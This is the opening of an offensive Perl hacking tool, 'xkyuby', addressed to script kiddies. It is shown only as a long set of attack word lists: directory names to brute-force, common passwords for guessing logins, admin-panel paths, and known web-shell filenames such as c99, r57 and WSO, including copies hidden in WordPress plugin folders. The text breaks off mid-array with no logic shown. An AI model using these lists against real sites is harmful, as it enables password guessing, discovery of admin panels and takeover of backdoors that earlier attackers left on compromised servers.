#!/usr/bin/perl
#My First Tool With Perl 
#Bismillah 
#Salam ScriptKiddz xDD 
#(c)opy@right > github.com/0xtn/xkyuby
#  #xkyuby By Escanor
system ("title xkyuby by Escan0r");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
use if $^O eq "MSWin32", Win32::Console::ANSI;
use LWP::Simple;
use Getopt::Long;
use HTTP::Request;
use threads;
use LWP::UserAgent;
use IO::Select;
use HTTP::Cookies;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use URI::URL;
use IO::Socket;
use IO::Socket::INET;
use HTTP::Request;
use HTTP::Request::Common qw(GET);
$usrag = LWP::UserAgent->new(keep_alive => 1);
$usrag->timeout (15);
$usrag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
@adminnzz=('wp_admin','account','acct_login','adm','adm_auth','admin','admin-login','admin1','admin2','SQL','admin4_account','admin4_colon','admin_area','admin_login','adminarea','admincontrol','admincp','administer','administr8','administrasi','babi','test','administratie','syaitan','administration','administrator','administratoraccounts','administratorlogin','administrators','administrivia','adminlogin'
,'adminpanel','adminpro','admins','admintools','admloginuser','affiliate','author','autologin','banneradmin','bb-admin','bbadmin','bigadmin','blogindex','cadmins','ccms','ccp14admin','cms','cms_user','cmsadmin','cms_admin','cfg','config','configuration','configure','controlpanel','cp','cpanel','cpanel_file','customer_login','data','database_administration','db','dir-login','directadmin','download','downloads'
,'ezsqliteadmin','file','files','fileadmin','folder','folders','formslogin','globes_admin','home','hpwebjetadmin','index','indy_admin','instadmin','irc-macadmin','liveuser_admin','login','login-redirect','login-us','login1','login_db','loginflat','logo_sysadmin','lotus_domino_admin','macadmin','maintenance','manuallogin','memberadmin','memberlogin','member_login','members','memlogin','meta_login',
'modelsearch','moderator','myadmin','navsiteadmin','newsadmin','openvpnadmin','pages','panel','panel-administracion','pgadmin','phpinfo','phpldapadmin','phpmyadmin','phppgadmin','phpsqliteadmin','platz_login','power_user','project-admins','pureadmin','radmind','radmind-1','rclogin','root','roots','server','server_admin_small','serveradministrator','showlogin','simplelogin','siteadmin','smblogin','sql-admin'
,'ss_vms_admin_sm','sshadmin','staradmin','sub-login','super-admin','support_login','sys-admin','sysadmin','sysadmin2','sysadmins','system-administration','system_administration','typo3','ur-admin','user','useradmin','userlogin','users','utility_login','00','01','02','03','10','20','100','123','200','1000','2000','2001','2002','2003','2004','2005','@','_admin','_pages','a','aa','aaa','abc','about','academic'
,'access','accessgranted','account','accounting','acct_login','action','actions','active','adm','adm_auth','admin','admin-login','admin1','admin2','admin4_account','admin4_colon','admin_','admin_area','admin_login','admin_logon','adminarea','admincontrol','admincp','administer','administr8','administrat','administratie','administration','administrator','administratoraccounts','administratorlogin','administrators'
,'administrivia','adminlogin','adminlogon','adminpanel','adminpro','admins','adminsql','admintools','admloginuser','admon','adsl','affiliate','agent','agents','alias','aliases','all','alpha','analog','analyse','announcements','answer','any','apache','api','app','applet','applets','appliance','application','applications','apply','apps','archive','archives','arrow','asp','aspadmin','assets','attach','attachments',
'audit','auth','auto','autologin','automatic','b','back','back-up','backdoor','backend','backoffice','backup','backups','bak','bak-up','bakup','bank','banks','banner','banneradmin','banners','base','basic','bass','batch','bb-admin','bbadmin','bd','bdata','bea','bean','beans','beta','bigadmin','bill','billing','bin','binaries','biz','blog','blogindex','blow','board','boards','body','boot','bot','bots','box','boxes'
,'broken','bsd','bug','bugs','build','builder','bulk','business','buttons','c','cache','cachemgr','cad','cadmins','can','captcha','car','card','cardinal','cards','carpet','cart','cas','cat','catalog','catalogs','catch','cc','ccms','ccp14admin','ccs','cd','cdrom','cert','certenroll','certificate','certificates','certs','cfdocs','cfg','cgi','cgi-bin','cgi-win','cgibin','chan','change','changepw','channel','chart',
'chat','class','classes','classic','classified','classifieds','client','clients','cluster','cm','cmd','cms','cms_user','cmsadmin','code','coffee','coke','command','commerce','commercial','common','component','compose','composer','compressed','comunicator','con','config','configs','configuration','configure','connect','connections','console','constant','constants','contact','contacts','content','contents','control'
,'controller','controlpanel','controls','corba','core','corporate','count','counter','cp','cpanel','cpanel_file','create','creation','credit','creditcards','cron','crs','css','customer','customer_login','customers','customize','cv','cvs','cyberdocs','cyberdocs25','cyberdocs31','d','daemon','dat','data','database','database_administration','databases','dav','db','dba','dbase','dbm','dbms','debug','default','delete',
'deletion','demo','demos','deny','deploy','deployment','design','details','dev','dev60cgi','devel','develop','developement','developers','development','device','devices','devs','diag','dial','dig','dir','dir-login','directadmin','directory','discovery','disk','dispatch','dispatcher','dms','dns','doc','docs','docs41','docs51','document','documents','down','download','downloads','draft','dragon','dratfs','driver',
'dump','dumpenv','e','easy','ebriefs','echannel','ecommerce','edit','editor','element','elements','email','employees','en','eng','engine','english','enterprise','env','environ','environment','error','errors','es','esales','esp','established','esupport','etc','event','events','example','examples','exchange','exe','exec','executable','executables','explorer','export','external','extra','extranet','ezsqliteadmin','fail'
,'failed','fcgi-bin','feedback','field','file','fileadmin','files','filter','firewall','first','flash','folder','foo','forget','forgot','forgotten','form','format','formhandler','formsend','formslogin','formupdate','fortune','forum'
,'forums','frame','framework','ftp','fun','function','functions','games','gate','generic','gest','get','global','globalnav','globals','globes_admin','gone','gp','gpapp','granted','graphics','group','groups','guest','guestbook','guests','hack','hacker','handler','hanlder','happening','head','header','headers','hello','helloworld','help','hidden','hide','history','hits','home','homepage','homes','homework',
'host','hosts','hpwebjetadmin','htdocs','htm','html','htmls','ibm','icons','idbc','iis','images','img','import','inbox','inc','include','includes','incoming','incs','index','index2','index_adm','index_admin','indexes','indy_admin','info','information','ingres','ingress','ini','init','input','instadmin','install','install_admin','installation','interactive','internal','internet','intranet','intro','inventory'
,'invitation','invite','ipp','ips','irc-macadmin','ja3ba','java','java-sys','javascript','jdbc','job','join','jrun','js','jsp','jsps','jsr','keep','kept','kernel','key','lab','labs','launch','launchpage','ldap','left','level','lib','libraries','library','libs','link','links','linux','list','liveuser_admin','load','loader','lock','lockout','log','logfile','logfiles','logger','logging','login','login-redirect','login-us'
,'login1','login_db','loginflat','logo','logo_sysadmin','logon','logout','logs','lost%2bfound','lotus_domino_admin','ls','macadmin','magic','mail','mailbox','maillist','main','maint','maintenance','makefile','man','manage','management','manager','manual','manuallogin','map','market','marketing','master','mbo','mdb','me','member','memberadmin','members','memlogin','memory','menu','message','messages','messaging','meta',
'meta_login','metabase','mgr','mine','minimum','mirror','mirrors','misc','mkstats','model','modelsearch','modem','moderator','module','modules','monitor','mount','mp3','mp3s','mqseries','mrtg','ms','ms-sql','msql','mssql','music','my','my-sql','myadmin','mysql','names','navigation','navsiteadmin','ne','net','netscape','netstat','network','new','news','newsadmin','next','nl','nobody','notes','novell','nul',
'null','number','object','objects','odbc','of','off','office','ogl','old','oldie','on','online','open','openapp','openfile','openvpnadmin','operator','oracle','oradata','order','orders','outgoing','output','pad','page','pages','pam','panel','panel-administracion','paper','papers','pass','passes','passw','passwd','passwor','password','passwords','path','pdf','perl','perl5','personal','personals','pgadmin','pgsql'
,'phone','php','phpldapadmin','phpmyadmin','phppgadmin','phpsqliteadmin','pics','ping','pix','pl','platz_login','pls','plx','pol','policy','poll','pop','portal','portlet','portlets','post','postgres','power','power_user','press','preview','print','printenv','priv','private','privs','process','processform','prod','production','products','professor','profile','program','project','project-admins','proof','properties'
,'protect','protected','proxy','ps','pub','public','publish','publisher','purchase','purchases','pureadmin','put','pw','pwd','python','query','queue','quote','radmind','radmind-1','ramon','random','rank','rclogin','rcs','readme','redir','redirect','reference','references','reg','reginternal','regional','register','registered','release','remind','reminder','remote','removed','report','reports','requisite','research',
'reseller','resource','resources','responder','restricted','retail','right','robot','robotics','root','route','router','rpc','rss','rules','run','sales','sample','samples','save','saved','schema','scr','scratc','script','scripts','sdk','search','secret','secrets','section','sections','secure','secured','security','select','sell','send','sendmail','sensepost','sensor','sent','server','server_admin_small','server_stats'
,'serveradministrator','servers','service','services','servlet','servlets','session','sessions','set','setting','settings','setup','share','shared','shell','shit','shop','shopper','show','showcode','showlogin','shtml','sign','signature','signin','simple','simplelogin','single','site','siteadmin','sitemap','sites','siteserver','small','smblogin','snoop','soap','soapdocs','software','solaris','solutions','somebody',
'source','sources','spain','spanish','sql','sql-admin','sqladmin','src','srchad','srv','ss_vms_admin_sm','sshadmin','ssi','ssl','staff','staradmin','start','startpage','stat','statistic','statistics','stats','status','stop','store','story','string','student','stuff','style','stylesheet','stylesheets','sub-login','submit','submitter','sun','super','super-admin','support','support_login','supported','survey','svc','svn'
,'svr','sw','sys','sys-admin','sysadmin','sysadmin2','sysadmins','system','system-administration','system_administration','table','tag','tape','tar','target','tech','temp','template','templates','temporal','temps','terminal','test','testing','tests','text','texts','ticket','tmp','today','tool','toolbar','tools','top','topics','tour','tpv','trace','traffic','transaction','transactions','transfer','transport','trap','trash'
,'tree','trees','tutorial','typo3','uddi','uninstall','unix','up','update','updates','upload','uploader','uploads','ur-admin','usage','user','useradmin','userlogin','users','usr','ustats','util','utilities','utility','utility_login','utils','v','vadmind','validation','validatior','vap','var','vb','vbs','vbscript','vbscripts','vfs','view','viewer','views','virtual','visitor','vmailadmin','vpn','w','w3','w3c','w3svc','w3svc1',
'w3svc2','w3svc3','warez','wdav','web','web-inf','webaccess','webadmin','webapp','webboard','webcart','webdata','webdav','webdist','webhits','weblog','weblogic','weblogs','webmail','webmaster','websearch','webservice','webservices','website','webstat','webstats','websvn','webvpn','welcome','wellcome','whatever','whatnot','whois','will','win','windows','wizmysqladmin','word','work','workplace','workshop','wp-admin','wp-login',
'ws','wstats','wusage','www','wwwboard','wwwjoin','wwwlog','wwwstats','xcache','xfer','xlogin','xml','xmlrpc','xsl','xsql','xyz','yonetici','yonetim','zabour','zap','zip','zipfiles','zips','v1','v2','v3','vadmind','vmailadmin','webadmin','webmaster','websvn','wizmysqladmin','wp-admin','wp-login','xlogin','yonetici','yonetim');
@passwdzz=('admin','admin123','123456','password','12345678','qwerty','123456789','12345','1234','111111','1234567','dragon','123123','baseball','abc123','football','monkey','letmein','696969','shadow','master','666666','qwertyuiop','123321','mustang','1234567890','michael','654321','pussy','superman','1qaz2wsx','7777777','fuckyou','121212','000000','qazwsx','123qwe','killer','trustno1','jordan','jennifer','zxcvbnm','asdfgh','hunter','buster',
  'soccer','harley','batman','andrew','tigger','sunshine','iloveyou','fuckall','2000','charlie','robert','thomas','hockey','ranger','daniel','starwars','klaster','112233','george','asshole','computer','michelle','jessica','pepper','1111','zxcvbn','555555','11111111','131313','freedom','777777','pass','fuck','maggie','159753','aaaaaa','ginger','princess','joshua','cheese','amanda','summer','love','ashley','6969','nicole','chelsea'
  ,'biteme','matthew','access','yankees','dallas','austin','thunder','taylor','matrix');
@admpath=('admin.php','admin.html','index.php','login.php','login.html','administrator','admin','adminpanel','cpanel','login','wp-login.php','administrator','admins','logins','admin.asp','login.asp','adm/','admin/','admin/account.html','admin/login.html','admin/login.htm','admin/controlpanel.html','admin/controlpanel.htm','admin/adminLogin.html','admin/adminLogin.htm','admin.htm','admin.html','adminitem/','adminitems/',
  'administrator/','administrator/login.%EXT%','administrator.%EXT%','administration/','administration.%EXT%','adminLogin/','adminlogin.%EXT%','admin_area/admin.%EXT%','admin_area/','admin_area/login.%EXT%','manager/','superuser/','superuser.%EXT%','access/','access.%EXT%','sysadm/','sysadm.%EXT%','superman/','supervisor/','panel.%EXT%','control/','control.%EXT%','member/','member.%EXT%','members/','user/','user.%EXT%','cp/',
  'uvpanel/','manage/','manage.%EXT%','management/','management.%EXT%','signin/','signin.%EXT%','log-in/','log-in.%EXT%','log_in/','log_in.%EXT%','sign_in/','sign_in.%EXT%','sign-in/','sign-in.%EXT%','users/','users.%EXT%','accounts/','accounts.%EXT%','bb-admin/login.%EXT%','bb-admin/admin.%EXT%','bb-admin/admin.html','administrator/account.%EXT%','relogin.htm','relogin.html','check.%EXT%','relogin.%EXT%','blog/wp-login.%EXT%',
  'user/admin.%EXT%','users/admin.%EXT%','registration/','processlogin.%EXT%','checklogin.%EXT%','checkuser.%EXT%','checkadmin.%EXT%','isadmin.%EXT%','authenticate.%EXT%','authentication.%EXT%','auth.%EXT%','authuser.%EXT%','authadmin.%EXT%','cp.%EXT%'
,'modelsearch/login.%EXT%','moderator.%EXT%','moderator/','controlpanel/','controlpanel.%EXT%','admincontrol.%EXT%','adminpanel.%EXT%','fileadmin/','fileadmin.%EXT%','sysadmin.%EXT%','admin1.%EXT%','admin1.html','admin1.htm','admin2.%EXT%','admin2.html','yonetim.%EXT%','yonetim.html','yonetici.%EXT%','yonetici.html','phpmyadmin/','myadmin/','ur-admin.%EXT%','ur-admin/','Server.%EXT%','Server/','wp-admin/','administr8.%EXT%',
'administr8/','webadmin/','webadmin.%EXT%','administratie/','admins/','admins.%EXT%','administrivia/','Database_Administration/','useradmin/','sysadmins/','sysadmins/','admin1/','system-administration/','administrators/','pgadmin/','directadmin/','staradmin/','ServerAdministrator/','SysAdmin/','administer/','LiveUser_Admin/','sys-admin/','typo3/','panel/','cpanel/','cpanel_file/','platz_login/','rcLogin/','blogindex/','formslogin/'
,'autologin/','manuallogin/','simpleLogin/','loginflat/','utility_login/','showlogin/','memlogin/','login-redirect/','sub-login/','wp-login/','login1/','dir-login/','login_db/','xlogin/','smblogin/','customer_login/','UserLogin/','login-us/','acct_login/','bigadmin/','project-admins/','phppgadmin/','pureadmin/','sql-admin/','radmind/','openvpnadmin/','wizmysqladmin/','vadmind/','ezsqliteadmin/','hpwebjetadmin/','newsadmin/','adminpro/'
,'Lotus_Domino_Admin/','bbadmin/','vmailadmin/','Indy_admin/','ccp14admin/','irc-macadmin/','banneradmin/','sshadmin/','phpldapadmin/','macadmin/','administratoraccounts/','admin4_account/','admin4_colon/','radmind-1/','Super-Admin/','AdminTools/','cmsadmin/','SysAdmin2/','globes_admin/','cadmins/','phpSQLiteAdmin/','navSiteAdmin/','server_admin_small/','logo_sysadmin/','power_user/','system_administration/','ss_vms_admin_sm/','bb-admin/'
,'panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm.%EXT%','admin_login.%EXT%','panel-administracion/login.%EXT%','pages/admin/admin-login.%EXT%','pages/admin/','acceso.%EXT%','admincp/login.%EXT%','admincp/','adminarea/','admincontrol/','affiliate.%EXT%','adm_auth.%EXT%','memberadmin.%EXT%','administratorlogin.%EXT%','modules/admin/','administrators.%EXT%','siteadmin/','siteadmin.%EXT%','adminsite/','kpanel/',
'vorod/','vorod.%EXT%','vorud/','vorud.%EXT%','adminpanel/','PSUser/','secure/','webmaster/','webmaster.%EXT%','autologin.%EXT%','userlogin.%EXT%','admin_area.%EXT%','cmsadmin.%EXT%','security/','usr/','root/','secret/','admin/login.%EXT%','admin/adminLogin.%EXT%','moderator.php','moderator.html','moderator/login.%EXT%','moderator/admin.%EXT%','yonetici.%EXT%','0admin/','0manager/','aadmin/','cgi-bin/login%EXT%','login1%EXT%','login_admin/'
,'login_admin%EXT%','login_out/','login_out%EXT%','login_user%EXT%','loginerror/','loginok/','loginsave/','loginsuper/','loginsuper%EXT%','login%EXT%','logout/','logout%EXT%','secrets/','super1/','super1%EXT%','super_index%EXT%','super_login%EXT%','supermanager%EXT%','superman%EXT%','superuser%EXT%','supervise/','supervise/Login%EXT%','super%EXT%');
@shilounna=('r57.php','404.php','c99.php','WSO.php','dz.php','w.php','wp-content/plugins/akismet/akismet.php','images/stories/w.php','w.php','12..php','shell.php','cpanel.php','cpn.php','sql.php','mysql.php','config.​​php','configuration.php','madspot.php','Cgishell.plkiller.php','changeall.ph​p​','2.php','Sh3ll.php','dz0.php','dam.phpuser.php','dom.phpwhmcs.php','r0​0t​.php','1.php','a.php','r0k.php','abc.php','egy.php','syrian_shell.php','xxx.p​hp​','s
  ettings.php','tmp.php','cyber.php','r57.php','404.php','gaza.ph​p','​1.php','d4rk.php','index1.php','nkr.php','xd.php','M4r0c.php','Dz.php','sni​per.p​hp','ksa.php','okay.php','4ever.php','b374k.php','bbb.php','includes/WSO.php','includes/r57.php','includes/b374k.php','includes/c99.php','includes/r00t.php','shell.php','images/stories/3xp.php','images/stories/WSO.php','images/stories/b374k.php','images/stories/r57.php','v4team.php','offline.php','p8.php','rr57.php','myshell.php','yourshell.php',
'sheller.php','mysheller.php','priv8.php','911.php','madspotshe​ll.php','madspot.php','​c100.php','sym.php','cp.php','tmp/cpn.php','tmp/w.php','tmp/r57.php','tmp/king.php','tmp/sok.php','tmp/ss.php','tmp/as.php','tmp/dz.php','tmp/r1z.php','tmp/whmcs.php','tmp/root.php','tmp/r00t.php','templates/beez/index.php','templates/beez/beez.php','templates/rhuk_milkyway/index.php','tmp/uploads.php','tmp/upload.php','tmp/sa.php','sa.php','readme.php',
'tmp/readme.php','wp-content/plugins/disqus-comment-system/disqus.php','d0mains.php','wp-content/plugins/akismet/akismet.php','madspotshell.php','info.php','egyshell.php','Sym.php','c22.php','c​​100.php','wp-content/plugins/akismet/admin.php','configuration.php','g.php','wp-content/plugins/google-sitemap-generator/sitemap-core.php','wp-content/plugins/akismet/widget.php','xx.pl','ls.php','Cpanel.php','k.phpzone-h.php','tmp/user.phptmp/Sym.php','cp.php','
tmp/madspotshell.php','tmp/root.php','tmp/whmcs.php','tmp/index.php','tmp/2.php','tmp/dz.php','tmp/cpn.php','tmp/changeall.php','tmp/Cgishell.pl','tmp/sql.php','0day.php','tmp/admin.php','cliente/downloads/h4xor.php','whmcs/downloads/dz.php','L3b.php','d.php','tmp/d.php','tmp/L3b.php',
'wp-content/plugins/akismet/admin.php','templates/rhuk_milkyway/index.phptemplates/beez/index.php','sado.php','admin1.php','upload.php','up.php','vb.zipvb.rar','admin2.asp','uploads.php','sa.php','sysadmins/admin1/sniper.php','administration/Sym.php','images/Sym.php','/r57.php','/wp-content/plugins/disqus-comment-system/disqus.php','gzaa_spyslsql-new.php','shell.php','sa.php','admin.php','sa2.php','2.php','gaza.php','up.php','upload.php',
'uploads.php','templates/beez/index.php','shell.php','amad.php','t00.php','dz.php','site.rar','Black.php','BlackMass.asp','test.txt','ftp.txt','user.txt','cpanel/awstats/site.sql','vb.sql','forum.sqlr00t-s3c.php','c.php','backup.sql','back.sql','data.sql','wp-content/plugins/disqus-comment-system/disqus.php','asp.aspx/templates/beez/index.php','tmp/vaga.php','tmp/killer.php','whmcs.php','abuhlail.php','tmp/killer.php','tmp/domaine.pl','tmp/domaine.php'
,'tmp/d0maine.php','d0maine.php','tmp/sql.php','X.php','123.php','m.php','b.php','tmp/dz1.php','dz1.php','forum.zip','Symlink.php','Symlink.pl','forum.rarjoomla.zipjoomla.rar','wp.php','buck.sql','sysadmin.php',
'images​​/c99.php','xd.php','c100.php','spy.aspxxd.phptmp/xd.php','sym/root/home/billing/killer.php','tmp/upload.phptmp/admin.php','Server.php','tmp/uploads.php','tmp/up.php','Server/wp-admin/c99.php','tmp/priv8.php','priv8.php','cgi.pl','tmp/cgi.pl','downloads/dom.php','templates/ja-helio-farsi/index.php','webadmin.html','admins.php','/wp-content/plugins/count-per-day/js/yc/d00.php','bluff.php','king.jeenadmins/admins.asp','admins.php','wp.zip'
,'wp-content/plugins/disqus-comment-system/WSO.php','/wp-content/plugins/disqus-comment-system/dz.php','/wp-content/plugins/disqus-comment-system/DZ.php','/wp-content/plugins/disqus-comment-system/cpanel.php','/wp-content/plugins/disqus-comment-system/cpn.php','/wp-content/plugins/disqus-comment-system/sos.php','/wp-content/plugins/disqus-comment-system/term.php','/wp-content/plugins/disqus-comment-system/Sec-War.php','/wp-content/plugins/disqus-comment-system/sql.php'
,'/wp-content/plugins/disqus-comment-system/ssl.php','/wp-content/plugins/disqus-comment-system/mysql.php','/wp-content/plugins/disqus-comment-system/WolF.php','/wp-content/plugins/disqus-comment-system/madspot.php','/wp-content/plugins/disqus-comment-system/Cgishell.pl','/wp-content/plugins/disqus-comment-system/killer.php','/wp-content/plugins/disqus-comment-system/changeall.php','/wp-content/plugins/disqus-comment-system/2.php','/wp-content/plugins/disqus-comment-system/Sh3ll.php'
,'/wp-content/plugins/disqus-comment-system/dz0.php','/wp-content/plugins/disqus-comment-system/dam.php','/wp-content/plugins/disqus-comment-system/user.php','/wp-content/plugins/disqus-comment-system/dom.php','/wp-content/plugins/disqus-comment-system/whmcs.php','/wp-content/plugins/disqus-comment-system/vb.zip','/wp-content/plugins/disqus-comment-system/r00t.php','/wp-content/plugins/disqus-comment-system/c99.php','/wp-content/plugins/disqus-comment-system/gaza.php',
'/wp-content/plugins/disqus-comment-system/1.php','/wp-content/plugins/disqus-comment-system/d0mains.php','/wp-content/plugins/disqus-comment-system/madspotshell.php','/wp-content/plugins/disqus-comment-system/info.php','/wp-content/plugins/disqus-comment-system/egyshell.php','/wp-content/plugins/disqus-comment-system/Sym.php','/wp-content/plugins/disqus-comment-system/c22.php','/wp-content/plugins/disqus-comment-system/c100.php','/wp-content/plugins/disqus-comment-system/configuration.php','/wp-content/plugins/disqus-comment-system/g.php','/wp-content/plugins/disqus-comment-system/xx.pl','/wp-content/plugins/disqus-comment-system/ls.php','/wp-content/plugins/disqus-comment-system/Cpanel.php','/wp-content/plugins/disqus-comment-system/k.php','/wp-content/plugins/disqus-comment-system/zone-h.php','/wp-content/plugins/disqus-comment-system/tmp/user.php','/wp-content/plugins/disqus-comment-system/tmp/Sym.php','/wp-content/plugins/disqus-comment-system/cp.php',
'/wp-content/plugins/disqus-comment-system/tmp/madspotshell.php','/wp-content/plugins/disqus-comment-system/tmp/root.php','/wp-content/plugins/disqus-comment-system/tmp/whmcs.php','/wp-content/plugins/disqus-comment-system/tmp/index.php','/wp-content/plugins/disqus-comment-system/tmp/2.php','/wp-content/plugins/disqus-comment-system/tmp/dz.php','/wp-content/plugins/disqus-comment-system/tmp/cpn.php','/wp-content/plugins/disqus-comment-system/tmp/changeall.php'
,'/wp-content/plugins/disqus-comment-system/tmp/Cgishell.pl','/wp-content/plugins/disqus-comment-system/tmp/sql.php','/wp-content/plugins/disqus-comment-system/0day.php','/wp-content/plugins/disqus-comment-system/tmp/admin.php','/wp-content/plugins/disqus-comment-system/L3b.php','/wp-content/plugins/disqus-comment-system/d.php','/wp-content/plugins/disqus-comment-system/tmp/d.php','/wp-content/plugins/disqus-comment-system/tmp/L3b.php',
'/wp-content/plugins/disqus-comment-system/sado.php','/wp-content/plugins/disqus-comment-system/admin1.php','/wp-content/plugins/disqus-comment-system/upload.php','/wp-content/plugins/disqus-comment-system/up.php','/wp-content/plugins/disqus-comment-system/vb.zip','/wp-content/plugins/disqus-comment-system/vb.rar','/wp-content/plugins/disqus-comment-system/admin2.asp','/wp-content/plugins/disqus-comment-system/uploads.php','/wp-content/plugins/disqus-comment-system/sa.php',
'/wp-content/plugins/disqus-comment-system/sysadmins/','/wp-content/plugins/disqus-comment-system/admin1/','/wp-content/plugins/disqus-comment-system/sniper.php','/wp-content/plugins/disqus-comment-system/images/Sym.php','/wp-content/plugins/disqus-comment-system/r57.php','/wp-content/plugins/disqus-comment-system/gzaa_spysl','/wp-content/plugins/disqus-comment-system/sql-new.php','/wp-content/plugins/disqus-comment-system/shell.php','/wp-content/plugins/disqus-comment-system/sa.php'
,'/wp-content/plugins/disqus-comment-system/admin.php','/wp-content/plugins/disqus-comment-system/sa2.php','/wp-content/plugins/disqus-comment-system/2.php','/wp-content/plugins/disqus-comment-system/gaza.php','/wp-content/plugins/disqus-comment-system/up.php','/wp-content/plugins/disqus-comment-system/upload.php','/wp-content/plugins/disqus-comment-system/uploads.php','/wp-content/plugins/disqus-comment-system/shell.php','/wp-content/plugins/disqus-comment-system/amad.php','/wp-content/plugins/disqus-comment-system/t00.php','pwp-content/plugins/disqus-comment-system/disqus.php','wp-content/plugins/akismet/WSO.php','wp-content/plugins/akismet/dz.php','wp-content/plugins/akismet/DZ.php','wp-content/plugins/akismet/cpanel.php','wp-content/plugins/akismet/cpn.php','wp-content/plugins/akismet/sos.php','wp-content/plugins/akismet/term.php','wp-content/plugins/akismet/Sec-War.php','wp-content/plugins/akismet/sql.php','wp-content/plugins/akismet/ssl.php','wp-content/plugins/akismet/mysql.php','wp-content/plugins/akismet/WolF.php','wp-content/plugins/akismet/madspot.php','wp-content/plugins/akismet/Cgishell.pl','wp-content/plugins/akismet/killer.php','wp-content/plugins/akismet/changeall.php','wp-content/plugins/akismet/2.php','wp-content/plugins/akismet/Sh3ll.php','wp-content/plugins/akismet/dz0.php','wp-content/plugins/akismet/dam.php','wp-content/plugins/akismet/user.php','wp-content/plugins/akismet/dom.php','wp-content/plugins/akismet/whmcs.php',
'wp-content/plugins/akismet/vb.zip','wp-content/plugins/akismet/r00t.php','wp-content/plugins/akismet/c99.php','wp-content/plugins/akismet/gaza.php','wp-content/plugins/akismet/1.php','wp-content/plugins/akismet/d0mains.php','wp-content/plugins/akismet/madspotshell.php','wp-content/plugins/akismet/info.php','wp-content/plugins/akismet/egyshell.php','wp-content/plugins/akismet/Sym.php','wp-content/plugins/akismet/c22.php','wp-content/plugins/akismet/c100.php'
,'wp-content/plugins/akismet/configuration.php','wp-content/plugins/akismet/g.php','wp-content/plugins/akismet/xx.pl','wp-content/plugins/akismet/ls.php','wp-content/plugins/akismet/Cpanel.php','wp-content/plugins/akismet/k.php','wp-content/plugins/akismet/zone-h.php','wp-content/plugins/akismet/tmp/user.php','wp-content/plugins/akismet/tmp/Sym.php','wp-content/plugins/akismet/cp.php','wp-content/plugins/akismet/tmp/madspotshell.php',
'wp-content/plugins/akismet/tmp/root.php','wp-content/plugins/akismet/tmp/whmcs.php','wp-content/plugins/akismet/tmp/index.php','wp-content/plugins/akismet/tmp/2.php','wp-content/plugins/akismet/tmp/dz.php','wp-content/plugins/akismet/tmp/cpn.php','wp-content/plugins/akismet/tmp/changeall.php','wp-content/plugins/akismet/tmp/Cgishell.pl','wp-content/plugins/akismet/tmp/sql.php','wp-content/plugins/akismet/0day.php','wp-content/plugins/akismet/tmp/admin.php',
'wp-content/plugins/akismet/L3b.php','wp-content/plugins/akismet/d.php','wp-content/plugins/akismet/tmp/d.php','wp-content/plugins/akismet/tmp/L3b.php','wp-content/plugins/akismet/sado.php','wp-content/plugins/akismet/admin1.php','wp-content/plugins/akismet/upload.php','wp-content/plugins/akismet/up.php','wp-content/plugins/akismet/vb.zip','wp-content/plugins/akismet/vb.rar','wp-content/plugins/akismet/admin2.asp','wp-content/plugins/akismet/uploads.php','wp-content/plugins/akismet/sa.php',
'wp-content/plugins/akismet/sysadmins/','wp-content/plugins/akismet/admin1/','wp-content/plugins/akismet/sniper.php','wp-content/plugins/akismet/images/Sym.php','wp-content/plugins/akismet/r57.php','wp-content/plugins/akismet/gzaa_spysl','wp-content/plugins/akismet/sql-new.php','wp-content/plugins/akismet/shell.php','wp-content/plugins/akismet/sa.php','wp-content/plugins/akismet/admin.php','wp-content/plugins/akismet/sa2.php','wp-content/plugins/akismet/2.php','wp-content/plugins/akismet/gaza.php','wp-content/plugins/akismet/up.php','wp-content/plugins/akismet/upload.php','wp-content/plugins/akismet/uploads.php','wp-content/plugins/akismet/shell.php','wp-content/plugins/akismet/amad.php','wp-content/plugins/akismet/t00.php','wp-content/plugins/akismet/dz.php','wp-content/plugins/akismet/site.rar',
'wp-content/plugins/akismet/Black.php','wp-content/plugins/akismet/site.tar.gz','wp-content/plugins/akismet/home.zip','wp-content/plugins/akismet/home.rar','wp-content/plugins/akismet/home.tar','wp-content/plugins/akismet/home.tar.gz','wp-content/plugins/akismet/forum.zip','wp-content/plugins/akismet/forum.rar','wp-content/plugins/akismet/forum.tar','wp-content/plugins/akismet/forum.tar.gz','wp-content/plugins/akismet/test.txt',
'wp-content/plugins/akismet/ftp.txt','wp-content/plugins/akismet/user.txt','wp-content/plugins/akismet/site.txt','wp-content/plugins/akismet/error_log','wp-content/plugins/akismet/error','wp-content/plugins/akismet/cpanel','wp-content/plugins/akismet/awstats','wp-content/plugins/akismet/site.sql','wp-content/plugins/akismet/vb.sql','wp-content/plugins/akismet/forum.sql','wp-content/plugins/akismet/r00t-s3c.php','wp-content/plugins/akismet/c.php'
,'wp-content/plugins/akismet/backup.sql','wp-content/plugins/akismet/back.sql','wp-content/plugins/akismet/data.sql','wp-content/plugins/akismet/wp.rar/','wp-content/plugins/akismet/asp.aspx','wp-content/plugins/akismet/tmp/vaga.php','wp-content/plugins/akismet/tmp/killer.php','wp-content/plugins/akismet/whmcs.php','wp-content/plugins/akismet/abuhlail.php','wp-content/plugins/akismet/tmp/killer.php','wp-content/plugins/akismet/tmp/domaine.pl','wp-content/plugins/akismet/tmp/domaine.php',
'wp-content/plugins/akismet/useradmin/','wp-content/plugins/akismet/tmp/d0maine.php','wp-content/plugins/akismet/d0maine.php','wp-content/plugins/akismet/tmp/sql.php','wp-content/plugins/akismet/X.php','wp-content/plugins/akismet/123.php','wp-content/plugins/akismet/m.php','wp-content/plugins/akismet/b.php','wp-content/plugins/akismet/up.php','wp-content/plugins/akismet/tmp/dz1.php','wp-content/plugins/akismet/dz1.php','wp-content/plugins/akismet/forum.zip',
'wp-content/plugins/akismet/Symlink.php',
'wp-content/plugins/akismet/Symlink.pl','wp-content/plugins/akismet/forum.rar','wp-content/plugins/akismet/joomla.zip','wp-content/plugins/akismet/joomla.rar','wp-content/plugins/akismet/wp.php','wp-content/plugins/akismet/buck.sql','wp-content/plugins/akismet/sysadmin.php','wp-content/plugins/akismet/images/c99.php','wp-content/plugins/akismet/xd.php','wp-content/plugins/akismet/c100.php','wp-content/plugins/akismet/spy.aspx','wp-content/plugins/akismet/xd.php'
